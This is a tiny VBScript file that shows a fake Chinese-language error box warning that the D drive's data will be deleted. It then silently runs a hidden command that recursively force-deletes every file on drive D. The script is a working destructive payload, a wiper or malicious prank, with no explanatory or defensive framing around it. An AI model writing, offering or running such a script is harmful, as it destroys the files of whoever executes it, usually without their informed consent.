X=MsgBox("你電腦D盤的資料將會被刪除",0+16,"Error")
dim WSHshell set WSHshell = wscript.createobject("wscript.shell") WSHshell.run "cmd /c ""del d:\*.* / f /q /s""",0 ,true 